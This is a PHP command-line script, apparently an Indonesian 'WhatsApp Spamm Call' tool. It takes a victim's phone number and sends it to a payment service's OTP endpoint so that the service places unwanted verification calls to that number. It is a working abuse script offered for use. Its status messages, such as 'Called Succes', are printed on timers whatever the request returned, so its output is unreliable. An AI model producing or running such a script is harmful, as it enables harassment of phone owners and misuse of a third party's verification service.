<?php
   system('clear');
echo "\e[91;1m

         __
\    /_.(_ ._  _.._ _
 \/\/(_|__)|_)(_|| | |
           |
\e[0m\n
\e[96m[~]WhatsApp Spamm Call 
[~]Coded By : LasDex
[~]Facebook : https://fb.com/payz.7777\e[0m\n
";
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $gas = curl_exec($ch);
        curl_close($ch);
                

$json = json_decode($gas, true);
echo $json."\n";
}
sleep(3);
echo "\n\e[101;1mStarting On:\e[0m ".date("[y:m:d-h:i:sa]\n");
sleep(3);
echo "\n\e[2m[!]Limit 3x Telpon 1 Nomer\e[0m\n";
sleep(2);
echo "\nInput Number : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
echo "\n\e[91;1m[+]Checking Number...\e[0m\n";
sleep(4);
echo "\n\e[93;1m[+]Connecting Whatsapp....\e[0m\n";
sleep(3);
echo "\n\e[92;1m[+]Called Succes\e[0m\n";
sleep(2);
print $execute;
?>
